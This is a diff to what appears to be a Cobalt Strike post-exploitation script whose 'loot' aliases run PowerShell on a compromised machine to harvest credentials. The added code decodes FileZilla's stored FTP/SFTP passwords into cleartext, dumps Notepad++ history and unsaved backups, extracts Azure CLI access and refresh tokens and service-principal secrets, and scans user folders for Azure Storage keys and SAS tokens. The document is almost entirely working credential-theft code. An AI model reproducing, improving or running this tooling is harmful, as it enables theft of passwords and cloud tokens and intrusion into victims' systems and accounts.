@@ -133,11 +133,34 @@ Get-ChildItem C:\\Users -Directory -ErrorAction SilentlyContinue | ForEach-Objec
     ) | ForEach-Object {
         if (Test-Path \$_) {
             Write-Host \"`n[FileZilla][\$u] \$_\" -ForegroundColor Cyan
-            [xml](Get-Content \$_ -ErrorAction SilentlyContinue) | Select-Xml '//Server' | ForEach-Object {
+            try {
+                [xml]\$xml = Get-Content \$_ -Raw -ErrorAction Stop
+            } catch {
+                Write-Host \"  [XML parse error] \$(\$_.Exception.Message)\"; return
+            }
+            \$xml | Select-Xml '//Server' | ForEach-Object {
                 \$n = \$_.Node
-                Write-Host \"  Host : \$(\$n.Host):\$(\$n.Port)  Proto:\$(\$n.Protocol)\"
-                Write-Host \"  User : \$(\$n.User)\"
-                Write-Host \"  Pass : \$(\$n.Pass)\"
+                # Protocol: 0=FTP 3=SFTP 4=FTPS 6=FTPES
+                \$proto = switch (\$n.Protocol) { '0'{'FTP'} '3'{'SFTP'} '4'{'FTPS'} '6'{'FTPES'} default {\"Proto:\$(\$n.Protocol)\"} }
+                # Logontype: 0=anonymous 1=normal 2=ask 3=interactive 4=key
+                \$ltype = switch (\$n.Logontype) { '0'{'anonymous'} '1'{'normal'} '2'{'ask'} '3'{'interactive'} '4'{'key-file'} default {\"logon:\$(\$n.Logontype)\"} }
+                Write-Host \"  Host     : \$(\$n.Host):\$(\$n.Port)  [\$proto]  [\$ltype]\"
+                Write-Host \"  User     : \$(\$n.User)\"
+                \$b64 = \$n.Pass
+                if (\$b64 -and \$b64.Trim() -ne '') {
+                    Write-Host \"  Pass(b64): \$b64\"
+                    try {
+                        \$dec = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\$b64))
+                        Write-Host \"  Pass(clr): \$dec\" -ForegroundColor Yellow
+                    } catch {
+                        Write-Host \"  Pass(clr): [not valid base64 — may be encrypted with master password]\" -ForegroundColor DarkYellow
+                    }
+                } else {
+                    Write-Host \"  Pass     : (empty / not stored)\"
+                }
+                # Key file for SFTP key-auth
+                if (\$n.Keyfile -and \$n.Keyfile -ne '') { Write-Host \"  Keyfile  : \$(\$n.Keyfile)\" -ForegroundColor Yellow }
+                Write-Host ''
             }
         }
     }
@@ -259,29 +282,54 @@ Get-ChildItem C:\\Users -Directory -ErrorAction SilentlyContinue | ForEach-Objec
 alias loot-notepadpp {
     local('$bid');
     $bid = $1;
-    blog($bid, "\c9[*] Hunting Notepad++ sessions and unsaved backups");
+    blog($bid, "\c9[*] Hunting Notepad++ sessions, history and unsaved backups");
     bpowershell($bid, "
 Get-ChildItem C:\\Users -Directory -ErrorAction SilentlyContinue | ForEach-Object {
     \$u    = \$_.Name
     \$base = \"\$(\$_.FullName)\\AppData\\Roaming\\Notepad++\"
+    if (-not (Test-Path \$base)) { return }
 
-    # session.xml — recent open files
-    \$sess = \"\$base\\session.xml\"
-    if (Test-Path \$sess) {
-        Write-Host \"`n[Notepad++ session][\$u]\" -ForegroundColor Cyan
-        [xml](Get-Content \$sess -ErrorAction SilentlyContinue) | Select-Xml '//File' | ForEach-Object {
-            Write-Host \"  \$(\$_.Node.filename)\"
-        }
+    # config.xml — <History> section contains recently opened files
+    \$cfg = \"\$base\\config.xml\"
+    if (Test-Path \$cfg) {
+        Write-Host \"`n[Notepad++ config.xml — recent files][\$u]\" -ForegroundColor Cyan
+        try {
+            [xml]\$xml = Get-Content \$cfg -Raw -ErrorAction Stop
+            \$files = \$xml | Select-Xml '//History/File' | ForEach-Object { \$_.Node.filename } |
+                      Where-Object { \$_ -and \$_.Trim() -ne '' -and (Test-Path \$_ -IsValid) }
+            if (\$files) { \$files | ForEach-Object { Write-Host \"  \$_\" } }
+            else         { Write-Host \"  (no recent file entries)\" -ForegroundColor DarkGray }
+        } catch { Write-Host \"  [parse error] \$(\$_.Exception.Message)\" -ForegroundColor DarkYellow }
     }
 
-    # backup dir — unsaved content
+    # session.xml — currently/previously open tabs
+    \$sess = \"\$base\\session.xml\"
+    if (Test-Path \$sess) {
+        Write-Host \"`n[Notepad++ session.xml — open tabs][\$u]\" -ForegroundColor Cyan
+        try {
+            [xml]\$xml = Get-Content \$sess -Raw -ErrorAction Stop
+            \$files = \$xml | Select-Xml '//File' | ForEach-Object { \$_.Node.filename } |
+                      Where-Object { \$_ -and \$_.Trim() -ne '' -and (Test-Path \$_ -IsValid) }
+            if (\$files) { \$files | ForEach-Object { Write-Host \"  \$_\" } }
+            else         { Write-Host \"  (no tab entries)\" -ForegroundColor DarkGray }
+        } catch { Write-Host \"  [parse error] \$(\$_.Exception.Message)\" -ForegroundColor DarkYellow }
+    }
+
+    # backup dir — unsaved/crash-recovered content (most valuable)
     \$bkup = \"\$base\\backup\"
     if (Test-Path \$bkup) {
-        Write-Host \"`n[Notepad++ backups][\$u] \$bkup\" -ForegroundColor Cyan
-        Get-ChildItem \$bkup -File -ErrorAction SilentlyContinue | ForEach-Object {
-            Write-Host \"  File: \$(\$_.Name)  (\$(\$_.Length) bytes)  Modified: \$(\$_.LastWriteTime)\"
-            \$preview = Get-Content \$_.FullName -TotalCount 10 -ErrorAction SilentlyContinue
-            \$preview | ForEach-Object { Write-Host \"    \$_\" }
+        \$bfiles = Get-ChildItem \$bkup -File -ErrorAction SilentlyContinue |
+                  Where-Object { \$_.Length -gt 0 } |
+                  Sort-Object LastWriteTime -Descending
+        if (\$bfiles) {
+            Write-Host \"`n[Notepad++ backups — unsaved content][\$u]\" -ForegroundColor Yellow
+            \$bfiles | ForEach-Object {
+                Write-Host \"  \$(\$_.LastWriteTime)  \$(\$_.Name)  (\$(\$_.Length) bytes)\"
+                \$preview = Get-Content \$_.FullName -TotalCount 15 -ErrorAction SilentlyContinue |
+                            Where-Object { \$_.Trim() -ne '' }
+                \$preview | ForEach-Object { Write-Host \"    \$_\" }
+                Write-Host ''
+            }
         }
     }
 }
@@ -357,13 +405,88 @@ Get-ChildItem C:\\Users -Directory -ErrorAction SilentlyContinue | ForEach-Objec
     \$az = \"\$home\\.azure\"
     if (Test-Path \$az) {
         Write-Host \"`n[Azure CLI][\$u] \$az\" -ForegroundColor Cyan
-        Get-ChildItem \$az -Filter '*.json' -ErrorAction SilentlyContinue | ForEach-Object {
-            Write-Host \"  \$(\$_.Name)  (\$(\$_.Length) bytes)\"
+        Get-ChildItem \$az -File -ErrorAction SilentlyContinue | ForEach-Object {
+            Write-Host \"  \$(\$_.Name)  (\$(\$_.Length) bytes)  \$(\$_.LastWriteTime)\"
         }
+
+        # Legacy token cache (Azure CLI < 2.30)
         \$tok = \"\$az\\accessTokens.json\"
         if (Test-Path \$tok) {
-            Write-Host '  [!] accessTokens.json found' -ForegroundColor Yellow
-            Get-Content \$tok -ErrorAction SilentlyContinue | Select-String 'accessToken|refreshToken|tenantId|userId' | ForEach-Object { Write-Host \"    \$_\" }
+            Write-Host '  [!] accessTokens.json (legacy token cache)' -ForegroundColor Yellow
+            Get-Content \$tok -ErrorAction SilentlyContinue |
+                Select-String 'accessToken|refreshToken|tenantId|userId|expiresOn' |
+                ForEach-Object { Write-Host \"    \$_\" }
+        }
+
+        # MSAL token cache (Azure CLI >= 2.30)
+        \$msal = \"\$az\\msal_token_cache.json\"
+        if (Test-Path \$msal) {
+            Write-Host '  [!] msal_token_cache.json (MSAL token cache)' -ForegroundColor Yellow
+            try {
+                \$j = Get-Content \$msal -Raw -ErrorAction Stop | ConvertFrom-Json
+                # AccessTokens section
+                if (\$j.AccessToken) {
+                    \$j.AccessToken.PSObject.Properties | ForEach-Object {
+                        \$t = \$_.Value
+                        Write-Host \"    Token  : \$(\$t.secret.Substring(0,[Math]::Min(40,\$t.secret.Length)))...\"
+                        Write-Host \"    Scope  : \$(\$t.target)\"
+                        Write-Host \"    Expires: \$(\$t.extended_expires_on)\"
+                        Write-Host \"    Realm  : \$(\$t.realm)\"
+                    }
+                }
+                # Accounts section — tenant/user info
+                if (\$j.Account) {
+                    \$j.Account.PSObject.Properties | ForEach-Object {
+                        \$a = \$_.Value
+                        Write-Host \"    Account: \$(\$a.username)  Tenant:\$(\$a.home_account_id)\"
+                    }
+                }
+            } catch { Write-Host \"    [parse error] \$(\$_.Exception.Message)\" -ForegroundColor DarkYellow }
+        }
+
+        # Service principal entries
+        \$sp = \"\$az\\service_principal_entries.json\"
+        if (Test-Path \$sp) {
+            Write-Host '  [!] service_principal_entries.json' -ForegroundColor Yellow
+            Get-Content \$sp -ErrorAction SilentlyContinue |
+                Select-String 'client_id|tenant|secret|certificate' |
+                ForEach-Object { Write-Host \"    \$_\" }
+        }
+
+        # clouds.config — custom cloud endpoints (sovereign clouds)
+        \$cc = \"\$az\\clouds.config\"
+        if (Test-Path \$cc) {
+            Write-Host '  [clouds.config]' -ForegroundColor Cyan
+            Get-Content \$cc -ErrorAction SilentlyContinue | ForEach-Object { Write-Host \"    \$_\" }
+        }
+    }
+
+    # Azure Storage — connection strings and account keys anywhere on disk
+    # Pattern: DefaultEndpointsProtocol=https;AccountName=...;AccountKey=<88-char-base64>
+    \$storagePattern = 'AccountKey=[A-Za-z0-9+/]{80,}={0,2}'
+    \$sasPattern     = 'sv=\d{4}-\d{2}-\d{2}&s[sco]=.*?&sig=[A-Za-z0-9%+/]+'
+    \$connStrPattern = 'DefaultEndpointsProtocol=https?;AccountName=[^;]+;AccountKey='
+    @(
+        \"\$home\\AppData\",
+        \"\$home\\Documents\",
+        \"\$home\\Desktop\"
+    ) | ForEach-Object {
+        if (Test-Path \$_) {
+            Get-ChildItem \$_ -Recurse -Include '*.json','*.config','*.xml','*.env','*.ini','*.txt','*.yml','*.yaml','*.ps1','*.sh','*.bat','*.cmd' -ErrorAction SilentlyContinue |
+                Where-Object { \$_.Length -lt 2MB } |
+                ForEach-Object {
+                    \$content = Get-Content \$_.FullName -Raw -ErrorAction SilentlyContinue
+                    if (\$content -match \$storagePattern -or \$content -match \$connStrPattern) {
+                        Write-Host \"`n  [!] Azure Storage key/connstr in: \$(\$_.FullName)\" -ForegroundColor Yellow
+                        \$content -split '\`n' | Select-String -Pattern \$storagePattern,\$connStrPattern |
+                            ForEach-Object { Write-Host \"      \$(\$_.Line.Trim().Substring(0,[Math]::Min(120,\$_.Line.Trim().Length)))\" }
+                    }
+                    if (\$content -match \$sasPattern) {
+                        Write-Host \"`n  [!] SAS token in: \$(\$_.FullName)\" -ForegroundColor Yellow
+                        \$content -split '\`n' | Select-String -Pattern \$sasPattern |
+                            ForEach-Object { Write-Host \"      \$(\$_.Line.Trim().Substring(0,[Math]::Min(120,\$_.Line.Trim().Length)))\" }
+                    }
+                }
         }
     }
 
